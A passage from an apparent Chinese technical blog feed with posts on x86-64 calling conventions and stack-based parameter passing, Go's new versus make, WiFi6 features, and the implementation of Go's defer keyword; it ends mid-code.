<li>pop x：首先，从 [sp-len(x), sp) 中读取数据存放到 x；然后，sp += len(x)。</li>
</ul>
<p>如果编译器能推断一个函数要占用多少空间，在进入这个函数时往往会为它预先分配好一段栈空间（如例二汇编代码第 18 行 <code>sub rsp, 32</code>，为 main 函数分配了 32 字节栈空间）。在这个函数退出时，调整 sp 的值销毁这段空间（例二汇编代码第 30 行 <code>add rsp, 32</code>）。</p>
<p>**bp(base pointer)**，中文名“基指寄存器”。因为随着指令执行 sp 是不断变化的，所以在进入函数时常用 bp 保存 sp 的初始值以对要用到的数据进行寻址定位（例二汇编代码第 6 行 <code>mov eax, DWORD PTR [rbp+36]</code>，第 21 行 <code>mov QWORD PTR [rbp-32], rax</code> 等）。</p>
<p>指令 <code>call x</code> 会设置 ip 寄存器的值为 x 的段偏移地址，达到“调用函数”的目的。这个过程分为两步：</p>
<ol>
<li>把 ip 寄存器的原址入栈（此时 ip 指向 call 的下一条指令），相当于 <code>push ip</code></li>
<li>更新 ip 寄存器的值，相当于 <code>mov ip, x</code></li>
</ol>
<p>指令 <code>ret</code> 从栈顶取值保存到 ip 寄存器，相当于 <code>call</code> 的逆操作。执行完 ret 指令后 ip 恢复到函数调用前的值，程序从而继续向下执行。</p>
<p>指令 <code>leave</code> 在函数执行结束后恢复 sp 和 bp 的值。上文说到进入函数时会把 sp 保存到 bp 再调整 sp 的值以为函数分配栈空间。那么在退出函数时自然要恢复原来的 sp 和 bp。这条指令相当于 <code>mov rsp, rbp</code> 和 <code>pop rbp</code> 的结合。</p>
<h2 id="利用寄存器传参"><a href="#利用寄存器传参" class="headerlink" title="利用寄存器传参"></a>利用寄存器传参</h2><p>来看例一：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">square</span><span class="params">(<span class="keyword">int</span> num)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> num * num;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> k = <span class="number">2</span>;</span><br><span class="line">    square(k);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在 x86-64 平台上汇编得到的结果是这样的：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">square:</span><br><span class="line">        push    rbp</span><br><span class="line">        mov     rbp, rsp</span><br><span class="line">        mov     DWORD PTR [rbp-4], edi</span><br><span class="line">        mov     eax, DWORD PTR [rbp-4]</span><br><span class="line">        imul    eax, eax</span><br><span class="line">        pop     rbp</span><br><span class="line">        ret</span><br><span class="line">main:</span><br><span class="line">        push    rbp</span><br><span class="line">        mov     rbp, rsp</span><br><span class="line">        sub     rsp, 16</span><br><span class="line">        mov     DWORD PTR [rbp-4], 2</span><br><span class="line">        mov     eax, DWORD PTR [rbp-4]</span><br><span class="line">        mov     edi, eax</span><br><span class="line">        call    square</span><br><span class="line">        mov     DWORD PTR [rbp-4], eax</span><br><span class="line">        mov     eax, 0</span><br><span class="line">        leave</span><br><span class="line">        ret</span><br></pre></td></tr></table></figure>

<p>变量 k 保存在内存 <code>[rbp-4]</code> 处，其值为 2。随后 <code>[rbp-4]</code> 中的值被存到了 <code>eax</code>，最后保存在 <code>edi</code>，这就完成了一次寄存器传参。square  函数更新 <code>rbp</code> 的值再从 <code>edi</code> 取值保存到 <code>[rbp-4]</code>，完成形参到实参的复制。square 把结果保存在 <code>eax</code> 里，main 读取 <code>eax</code> 得到调用返回值。</p>
<h2 id="用栈传参"><a href="#用栈传参" class="headerlink" title="用栈传参"></a>用栈传参</h2><p>当参数的数量过多无法全部保存到寄存器里或长度超过了机器字长，就要用到栈来传参。再来看例二：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">20</span>];</span><br><span class="line">    <span class="keyword">int</span>  age;</span><br><span class="line">&#125;Person;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">greet</span><span class="params">(Person people)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;hello %s, you are %d years old.\n&quot;</span>, people.name, people.age);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Person me = &#123;name: <span class="string">&quot;Rowan&quot;</span>, age: <span class="number">21</span>&#125;;</span><br><span class="line">    greet(me);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>翻译成汇编语言是这样：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.LC0:</span><br><span class="line">        .string &quot;hello %s, you are %d years old.\n&quot;</span><br><span class="line">greet:</span><br><span class="line">        push    rbp</span><br><span class="line">        mov     rbp, rsp</span><br><span class="line">        mov     eax, DWORD PTR [rbp+36]</span><br><span class="line">        mov     edx, eax</span><br><span class="line">        lea     rsi, [rbp+16]</span><br><span class="line">        mov     edi, OFFSET FLAT:.LC0</span><br><span class="line">        mov     eax, 0</span><br><span class="line">        call    printf</span><br><span class="line">        nop</span><br><span class="line">        pop     rbp</span><br><span class="line">        ret</span><br><span class="line">main:</span><br><span class="line">        push    rbp</span><br><span class="line">        mov     rbp, rsp</span><br><span class="line">        sub     rsp, 32</span><br><span class="line">        movabs  rax, 474081619794</span><br><span class="line">        mov     edx, 0</span><br><span class="line">        mov     QWORD PTR [rbp-32], rax</span><br><span class="line">        mov     QWORD PTR [rbp-24], rdx</span><br><span class="line">        mov     DWORD PTR [rbp-16], 0</span><br><span class="line">        mov     DWORD PTR [rbp-12], 21</span><br><span class="line">        sub     rsp, 8</span><br><span class="line">        push    QWORD PTR [rbp-16]</span><br><span class="line">        push    QWORD PTR [rbp-24]</span><br><span class="line">        push    QWORD PTR [rbp-32]</span><br><span class="line">        call    greet</span><br><span class="line">        add     rsp, 32</span><br><span class="line">        mov     eax, 0</span><br><span class="line">        leave</span><br><span class="line">        ret</span><br></pre></td></tr></table></figure>

<p>一个 Person 实例占 24 字节，超过了 x86-64 平台下一个通用寄存器的最大长度（8 字节），编译器用栈来保存参数。</p>
<p>26 到 28 行的三个 <code>push</code> 操作把 me 入栈，随后用 <code>call</code> 指令跳到 square 函数。square 函数在栈的 <code>[rbp+36]</code> 取到 age 成员的值，取 <code>[rbp+16]</code> （name 成员）的内存地址放入 <code>rsi</code>，完成一次传参。</p>
<h2 id="如何实现多返回值"><a href="#如何实现多返回值" class="headerlink" title="如何实现多返回值"></a>如何实现多返回值</h2><p>前面说到，调用方通过读取 <code>eax</code> 寄存器得到被调用函数的返回值，而 <code>eax</code> 只能存放一个值，那么像 Golang 这种支持多返回值的语言是如何实现的呢？答案就是栈。</p>
<p>Golang 统一用栈来传参，函数调用前在调用者栈帧上就已经预先为返回值分配好了内存空间，被调用函数只需要把返回值依次填进去就好了。</p>
<p><img src="https://i.loli.net/2021/01/16/vAlpKw2HEYWcfS7.png" alt="go函数调用内存模型.png"></p>
<p>统一使用栈传参最直接的好处当然就是支持多返回值，以及便于编译器生成汇编代码了。但是相比 C 等支持寄存器传参的语言来说，主要弊端在于传参速度慢，因为 CPU 访问栈的开销比访问寄存器高几十倍。</p>
]]></content>
      <categories>
        <category>计算机系统</category>
      </categories>
      <tags>
        <tag>内存模型</tag>
      </tags>
  </entry>
  <entry>
    <title>Golang 关键字 new 和 make 有啥不同?</title>
    <url>/2020/08/03/Golang-%E5%85%B3%E9%94%AE%E5%AD%97-new-%E5%92%8C-make-%E6%9C%89%E5%95%A5%E4%B8%8D%E5%90%8C/</url>
    <content><![CDATA[<p>当我们想要得到一个切片、哈希表或者 channel 的实例，我们常使用 <code>make</code>；而如果我们需要一个指针，我们可以用 <code>new</code>：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Person <span class="keyword">struct</span> &#123;</span><br><span class="line">    Age <span class="keyword">int8</span></span><br><span class="line">    Name <span class="keyword">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    ch := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">string</span>)</span><br><span class="line">    s := <span class="built_in">make</span>([]<span class="keyword">string</span>, <span class="number">0</span>)</span><br><span class="line">    m := <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">int</span>]<span class="keyword">string</span>)</span><br><span class="line"></span><br><span class="line">    i := <span class="built_in">new</span>(<span class="keyword">int</span>) <span class="comment">// i 为 *int 类型</span></span><br><span class="line">    pp := <span class="built_in">new</span>(Person) <span class="comment">// pp 为 *Person 类型</span></span><br><span class="line">    p := Person&#123;&#125; <span class="comment">// p 为 Person 类型实例</span></span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>new</code> 只是申请了一片该类型的内存空间并将其置 0，然后返回指向这个空间的指针，换言之，new 得到的指针指向的是该类型的零值；而 <code>make</code> 在申请内存的同时初始化这个内置的数据结构：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    mMap := <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">int</span>]<span class="keyword">string</span>)</span><br><span class="line">    nMap := <span class="built_in">new</span>(<span class="keyword">map</span>[<span class="keyword">int</span>]<span class="keyword">string</span>)</span><br><span class="line"></span><br><span class="line">    fmt.Println(mMap == <span class="literal">nil</span>)     <span class="comment">// false</span></span><br><span class="line">    fmt.Println(*nMap == <span class="literal">nil</span>)    <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line">    mMap[<span class="number">0</span>] = <span class="string">&quot;hello world&quot;</span></span><br><span class="line">    nMap[<span class="number">0</span>] = <span class="string">&quot;hello world&quot;</span>     <span class="comment">// panic: assignment to entry in nil map</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>总结：</p>
<ol>
<li><code>make</code> 只能用于内置的 map、slice、channel 类型，<code>new</code> 可以用于任何类型 </li>
<li><code>make</code> 得到类型实例，<code>new</code> 得到类型指针</li>
<li><code>make</code> 在申请内存同时初始化对象，<code>new</code> 只是申请了一片内存并且将其置为类型零值</li>
</ol>
]]></content>
      <categories>
        <category>语言</category>
      </categories>
      <tags>
        <tag>Go</tag>
      </tags>
  </entry>
  <entry>
    <title>浅谈WiFi6</title>
    <url>/2020/07/30/%E6%B5%85%E8%B0%88WiFi6/</url>
    <content><![CDATA[<p>WiFi6 好处都有啥？谁说对了就给他！</p>
<span id="more"></span>

<h2 id="什么是-WiFi6"><a href="#什么是-WiFi6" class="headerlink" title="什么是 WiFi6"></a>什么是 WiFi6</h2><p>WiFi 标准是 IEEE（电气电子工程师学会）制定的标准之一，IEEE 将最近几代的 WiFi 标准依次命名为 802.11n, 802.11ac, 802.11ax。WiFi 联盟则是一个商业组织，主要目的是在全球范围内推行 WiFi 产品的兼容认证，发展 IEEE802.11 标准的无线局域网技术。</p>
<p>2018年底，为了方便宣传与推广，WiFi 联盟为 WiFi 标准推出了更为简单好记的名字：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">802.11n = WiFi4</span><br><span class="line">802.11ac = WiFi5</span><br><span class="line">802.11ax = WiFi6</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2020/07/30/vNi1Pqt4cxpeC8A.png" alt="各版本WiFi对比"></p>
<h2 id="OFDMA"><a href="#OFDMA" class="headerlink" title="OFDMA"></a>OFDMA</h2><p>使用 OFDM， 每一帧数据只能服务一个设备；而使用 OFDMA，每一帧数据可以被多个设备所使用。</p>
<p><img src="https://i.loli.net/2020/07/30/fAW9UZlwxkYJOPz.png" alt="OFDM与OFDMA"></p>
<p>一个通俗的比喻是卡车。使用 OFDM 卡车每次只能给一家运货，即使这次运输卡车没装满。而 OFDMA 一次可以把东西运给多家，这样就不会浪费运力了。</p>
<p><img src="https://i.loli.net/2020/07/30/P92vCYuAUaTcMRb.png" alt="OFDMA卡车"></p>
<h2 id="MU-MIMO"><a href="#MU-MIMO" class="headerlink" title="MU-MIMO"></a>MU-MIMO</h2><p>传统的 SU-MIMO 的路由器信号呈一个环状散发，根据距离依次单独与设备进行通讯。当接入设备过多会导致部分设备长期处于等待状态，造成所谓“信号满格网速很慢”的现象。更为严重的是，每次通讯的带宽 = 总带宽 / 接入设备数。这样就造成了大量浪费。<br>而 MU-MIMO 路由器对信号进行频分、码分等复用，这样一台有 n 根天线的 MU-MIMO 路由器可以和最多 n台设备同时通讯且每个设备都能最大限度利用频宽，数据传输速率提高了 n 倍。<br>支持 MU-MIMO 的路由器同时与 SU-MIMO 设备和 MU-MIMO 设备通信时会混着用这两种技术。举例来说设备 1 是 SU-MIMO，设备 2、3 是 MU-MIMO，那 MU-MIMO 路由器和 1 通信时使用 SU-MIMO，和 2、3 通信时使用 MU-MIMO。<br>MU-MIMO 只是利用了空置的天线，并不一定就能提高 wifi 速度。如果当前所有天线都被利用上了再使用 MU-MIMO 也没效果。比如 MU-MIMO 路由器与 3 台 MU-MIMO 设备 + 1 台 SU-MIMO 设备通信，此时路由器 3 根天线都满载了，把那一台 SU-MIMO 升级成 MU-MIMO 并不会对网速有提升。<br>与 wifi 5 相比 wifi6 的提升在于支持上行 MU-MIMO，这在用户上传数据的时候很有用</p>
<p><img src="https://i.loli.net/2020/07/30/CWQzdSU2youTrVx.png" alt="MU-MIMO"></p>
<h2 id="调制模式"><a href="#调制模式" class="headerlink" title="调制模式"></a>调制模式</h2><p>QAM 是一种在两个正交载波上进行幅度调制的调制方式，xQAM 代表了一个传输单元含 x 子载波，即路由器每一帧最多能传输多少数据。</p>
<p><img src="https://i.loli.net/2020/07/30/Sx541NemKHCt8Jn.png" alt="QAM"></p>
<ul>
<li>WIFI5：最高为 256-QAM，但是有效子载波数量只有 234 个。使用 160Mhz 频宽就是 468 个。</li>
<li>WIFI6：最高为1024-QAM，但是有效子载波数量的只有 980 个。使用 160Mhz 频宽时候为 1960 个</li>
</ul>
<p>WIFI5 一个QAM传输 8bit 数据，WIFI6 用的是10Bit数据。两者最高速度时候的编码率都是5/6。wifi6 每帧传输更多的数据，用户感受到的“网速”也就变快了。<br>在 120MHz 下 wifi6 理论上单流最高可达 1021Mbps，极限 8 串流达到 9607Mbps(9.3Gbps)。当然，具体速度如何还受用户网络带宽等因素的限制。</p>
<h2 id="TWT"><a href="#TWT" class="headerlink" title="TWT"></a>TWT</h2><p>TWT(Target Wake Time) 主要面向于智能家居产品，这些设备通过沟通告诉路由器什么时候唤醒设备，其他时间不要找我（维持wifi连接），避免多个设备同时通信造成等待，减少无线网络天线使用及信号搜索时间，进而减少智能家居产品的耗电问题。但该技术并不是对所有设备都有帮助，例如笔记本电脑需要持续的互联网访问，因此不太可能过多地受益于此功能。</p>
<p><img src="https://i.loli.net/2020/07/30/3AU7J1MhsSHRafY.png" alt="TWT"></p>
<h2 id="SR"><a href="#SR" class="headerlink" title="SR"></a>SR</h2><p>SR(spacial reuse) 指空间复用技术，作用是实现高密度场景下（空间中同时存在多个路由信号）的信道复用</p>
<p><img src="https://i.loli.net/2020/07/30/qdfQhs6vFXzpLik.png" alt="SR"></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>当前主流路由器已经支持 WiFi5，由于 WiFi5 仅支持 5G 频段，而现实里还存在不少只支持 2.4G 频段的设备，因此路由器会向下兼容 WiFi 4 的标准，也就是它们在 2.4G 频段使用的 WiFi4 确保向下兼容，在 5G 频段则使用的 WiFi5。<br>WiFi6 同时支持 2.4G 和 5G 频段，若 WiFi6 路由器和支持 WiFi6 的终端普及后，结合上文内容，预计带来的增益有：</p>
<ol>
<li>速度更快，可将无线速率提高到最高9.6Gbps，满足高速率应用需求，主要通过1024QAM、160Mhz、更多的空间流等实现</li>
<li>延迟更低，通过MU-MIMO、OFDMA实现</li>
<li>网络容量提升，对同时连接多设备的场景支持更好，通过MU-MIMO、OFDMA实现</li>
<li>信号更加稳定，抗干扰能力和覆盖范围增强，通过支持 2.4G 频段、SR等实现</li>
<li>此外，为了支持新的技术特性，WiFi 6路由器本身在硬件规格（处理器、内存等）上也会有提升，硬件上的提升也会带来各方面更好的效果，所以对于不支持 WiFi6 的设备也有一定增益</li>
</ol>
]]></content>
      <categories>
        <category>计算机网络</category>
      </categories>
      <tags>
        <tag>硬件</tag>
      </tags>
  </entry>
  <entry>
    <title>Go底层大冒险之defer</title>
    <url>/2020/07/09/Go%E5%BA%95%E5%B1%82%E5%A4%A7%E5%86%92%E9%99%A9%E4%B9%8Bdefer/</url>
    <content><![CDATA[<h2 id="defer"><a href="#defer" class="headerlink" title="defer"></a>defer</h2><h3 id="应用"><a href="#应用" class="headerlink" title="应用"></a>应用</h3><p>与 Python 中的 <code>with</code> 类似，Golang 使用 <code>defer</code> 关键字替我们管理函数的退出时的清除操作。一个经典的例子如下：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">CopyFile</span><span class="params">(dstName, srcName <span class="keyword">string</span>)</span> <span class="params">(written <span class="keyword">int64</span>, err error)</span></span> &#123;</span><br><span class="line">    src, err := os.Open(srcName)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    dst, err := os.Create(dstName)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    written, err = io.Copy(dst, src)</span><br><span class="line">    dst.Close()</span><br><span class="line">    src.Close()</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面这段代码有个 bug 就是如果 <code>os.create</code> 调用失败，整个函数会直接 return，然而此时 src 的文件描述符并没有关闭。当然在 return 前调用一次 src.Clouse 可以解决问题。然而一旦项目变得复杂，这种隐晦的问题就不容易被注意到。因此，<code>defer</code> 便应运而生了。把关闭文件描述符这个操作交给运行时去管理，我们就不用担心会发生资源泄露了：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">CopyFile</span><span class="params">(dstName, srcName <span class="keyword">string</span>)</span> <span class="params">(written <span class="keyword">int64</span>, err error)</span></span> &#123;</span><br><span class="line">    src, err := os.Open(srcName)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">defer</span> src.Close()</span><br><span class="line"></span><br><span class="line">    dst, err := os.Create(dstName)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">defer</span> dst.Close()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> io.Copy(dst, src)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>古人云：defer 好，defer 妙，defer 棒的呱呱叫。但其实在使用过程中也有几个必须要注意的点：</p>
<ul>
<li>defer 函数的参数会被预计算。换言之，<strong>defer 函数的参数值在其注册时就已经确定了</strong>。如下所示，A 中的 defer 函数在注册时就执行了 <code>time.Since(startedAt)</code> 并进行传参；而 B 注册了一个闭包，<code>time.Since(startedAt)</code> 在 defer 函数中才执行。总结起来就是：在 defer 函数声明时，对外部变量的引用有两种方式：作为函数参数 or 作为闭包引用。作为函数参数，则在 defer 声明时就把值传给 defer；作为闭包引用，则会在 defer 函数执行时根据整个上下文确定当前的值。：</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">//output: 0s</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">A</span><span class="params">()</span></span> &#123;</span><br><span class="line">    startedAt := time.Now()</span><br><span class="line">    <span class="keyword">defer</span> fmt.Println(time.Since(startedAt))</span><br><span class="line"></span><br><span class="line">    time.Sleep(time.Second)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//output: 1s</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">B</span><span class="params">()</span></span> &#123;</span><br><span class="line">    startedAt := time.Now()</span><br><span class="line">    <span class="keyword">defer</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">        fmt.Println(time.Since(startedAt))</span><br><span class="line">    &#125;()</span><br><span class="line"></span><br><span class="line">    time.Sleep(time.Second)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>defer 函数根据后进先出（Last In First Out）的原则调用：</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">b</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">4</span>; i++ &#123;</span><br><span class="line">        <span class="keyword">defer</span> fmt.Print(i)</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="comment">// output: 3210</span></span><br></pre></td></tr></table></figure>

<ul>
<li>defer 函数可以读取和修改<strong>命名</strong>返回值：</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">c</span><span class="params">()</span> <span class="params">(i <span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line">    <span class="keyword">defer</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">         i++</span><br><span class="line">     &#125;()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">&#125; <span class="comment">// i 为 2</span></span><br></pre></td></tr></table></figure>

<p>这个过程被拆解如下：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">c</span><span class="params">()</span> <span class="params">(i <span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line">    i = <span class="number">1</span>         <span class="comment">// 给命名返回值赋值</span></span><br><span class="line">    i++           <span class="comment">// 函数返回前插入 defer 函数，将 i 加一</span></span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这是<em>因为 return 语句先给命名返回值赋值，再执行 defer 中的函数（命名返回值在延迟函数前声明，故延迟函数可以对其进行操作），最后用 ret 指令退出</em>。如果是匿名返回值，其在 defer 语句前没有声明，延迟函数也就无从改变它的值：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">d</span><span class="params">()</span> <span class="title">int</span></span> &#123;</span><br><span class="line">    i := <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">defer</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">        i = <span class="number">2</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> i</span><br><span class="line">&#125; <span class="comment">// i 为 1</span></span><br></pre></td></tr></table></figure>

<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>先来看一下 defer 关键字在 go 中对应的结构体 <a href="https://github.com/golang/go/blob/e1faebe7b40c23811a6025ed104d3ce9882f0c3b/src/runtime/runtime2.go#L903">runtime._defer</a>：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> _defer <span class="keyword">struct</span> &#123;</span><br><span class="line">    siz       <span class="keyword">int32</span></span><br><span class="line">    heap      <span class="keyword">bool</span></span><br><span class="line">    openDefer <span class="keyword">bool</span></span><br><span class="line">    sp        <span class="keyword">uintptr</span></span><br><span class="line">    pc        <span class="keyword">uintptr</span></span><br><span class="line">    fn        *funcval</span><br><span class="line">    _panic    *_panic</span><br><span class="line">    link      *_defer</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><code>siz</code> 延迟函数的参数和返回值大小</li>
<li><code>heap</code> 这个结构体是否在堆上分配</li>
<li><code>sp</code> 和 <code>pc</code> 分别是调用者栈指针和程序计数器</li>
<li><code>fn</code> 延迟函数指针</li>
<li><code>_panic</code> 触发这个 defer 的 panic</li>
<li><code>openDefer</code> 表示当前 defer 是否经过开放编码的优化</li>
<li><code>link</code> 下一个 _defer 结构体</li>
</ul>
<p>多个 <a href="https://github.com/golang/go/blob/e1faebe7b40c23811a6025ed104d3ce9882f0c3b/src/runtime/runtime2.go#L903">runtime._defer</a> 结构体通过 <code>link</code> 字段以链表的形式组织起来。</p>
<h3 id="编译阶段对-defer-的处理"><a href="#编译阶段对-defer-的处理" class="headerlink" title="编译阶段对 defer 的处理"></a>编译阶段对 defer 的处理</h3><p>编译阶段编译器会使用 <a href="https://github.com/golang/go/blob/4d5bb9c60905b162da8b767a8a133f6b4edcaa65/src/cmd/compile/internal/gc/ssa.go#L1023">cmd/compile/internal/gc.state.stmt</a> 函数处理代码里的 defer 关键字，该函数会根据条件的不同，使用三种不同的机制处理该关键字：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *state)</span> <span class="title">stmt</span><span class="params">(n *Node)</span></span> &#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">switch</span> n.Op &#123;</span><br><span class="line">    <span class="keyword">case</span> ODEFER:</span><br><span class="line">        ...</span><br><span class="line">        <span class="keyword">if</span> s.hasOpenDefers &#123;</span><br><span class="line">            s.openDeferRecord(n.Left) <span class="comment">// 开放编码</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            d := callDefer <span class="comment">// 堆分配 _defer 结构体</span></span><br><span class="line">            <span class="keyword">if</span> n.Esc == EscNever &#123;</span><br><span class="line">                d = callDeferStack <span class="comment">// 栈分配 _defer 结构体</span></span><br><span class="line">            &#125;</span><br><span class="line">            s.call(n.Left, d)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>堆分配是 Go 最早的实现方式，但是这样性能较差，在高并发场景下可能拖慢系统的速度。从 1.13 开始新增了栈分配，减少了 30% 的额外开销，并在 1.14 中引入了基于开放编码的 defer，使得该关键字的额外开销可以忽略不计。</p>
<h3 id="堆上分配"><a href="#堆上分配" class="headerlink" title="堆上分配"></a>堆上分配</h3><p><a href="https://github.com/golang/go/blob/4d5bb9c60905b162da8b767a8a133f6b4edcaa65/src/cmd/compile/internal/gc/ssa.go#L1023">cmd/compile/internal/gc.state.stmt</a> 函数最后调用了 <a href="https://github.com/golang/go/blob/4d5bb9c60905b162da8b767a8a133f6b4edcaa65/src/cmd/compile/internal/gc/ssa.go#L4324">cmd/compile/internal/gc.state.call</a>。call 函数不只用在 defer 关键字，还被用来为所有函数和方法生成中间代码，但这里我们只关注与 defer 有关的部分：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *state)</span> <span class="title">call</span><span class="params">(n *Node, k callKind)</span> *<span class="title">ssa</span>.<span class="title">Value</span></span> &#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">var</span> call *ssa.Value</span><br><span class="line">    <span class="keyword">if</span> k == callDeferStack &#123;</span><br><span class="line">        <span class="comment">// 在栈上初始化 defer 结构体</span></span><br><span class="line">        ...</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        ...</span><br><span class="line">        <span class="keyword">switch</span> &#123;</span><br><span class="line">        <span class="keyword">case</span> k == callDefer:</span><br><span class="line">            call = s.newValue1A(ssa.OpStaticCall, types.TypeMem, deferproc, s.mem()) <span class="comment">// 调用 runtime.deferproc 函数</span></span><br><span class="line">        ...</span><br><span class="line">        &#125;</span><br><span class="line">        call.AuxInt = stksize <span class="comment">// Call operations carry the argsize of the callee along with them</span></span><br><span class="line">    &#125;</span><br><span class="line">    s.vars[&amp;memVar] = call</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>defer 关键字在运行期间会调用 <a href="https://github.com/golang/go/blob/2517f4946b42b8deedb864c884f1b41311d45850/src/runtime/panic.go#L223">runtime.deferproc</a> 函数，这个函数接收了参数的大小和闭包所在的地址两个参数，负责创建新的延迟调用任务：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">deferproc</span><span class="params">(siz <span class="keyword">int32</span>, fn *funcval)</span></span> &#123;</span><br><span class="line">    gp := getg()</span><br><span class="line">    <span class="keyword">if</span> gp.m.curg != gp &#123;</span><br><span class="line">        throw(<span class="string">&quot;defer on system stack&quot;</span>) <span class="comment">// go code on the system stack can&#x27;t defer</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    sp := getcallersp()</span><br><span class="line">    argp := <span class="keyword">uintptr</span>(unsafe.Pointer(&amp;fn)) + unsafe.Sizeof(fn)</span><br><span class="line">    callerpc := getcallerpc()</span><br><span class="line"></span><br><span class="line">    d := newdefer(siz)</span><br><span class="line">    <span 